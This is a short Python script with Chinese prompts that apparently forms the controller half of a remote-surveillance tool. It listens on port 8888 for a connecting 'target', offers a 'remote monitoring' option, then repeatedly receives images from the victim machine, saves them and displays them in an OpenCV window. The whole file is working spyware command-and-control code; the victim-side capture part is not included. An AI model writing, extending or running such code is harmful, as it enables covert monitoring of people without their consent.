from socket import *
import cv2

S = socket()
S.bind(('0.0.0.0',8888))
S.listen()
print("等待连接……")

s,addr = S.accept()
print(f"目标已连接！{addr}")

print("选择的功能：")
print('1.远程监视')
choice = input("请选择：")
s.send(choice.encode())

if choice == '1':
    while True:
        size = int(s.recv(1024).decode())
        s.send('ok'.encode())

        cursize = 0
        with open('save.jpg','wb') as file:
            while cursize < size:
                data = s.recv(2048)
                file.write(data)
                cursize += len(data)

        cv2.namedWindow('monitor')
        image = cv2.imread('save.jpg')
        cv2.imshow('save',image)
        cv2.waitKey(20)

        s.send('ok'.encode())




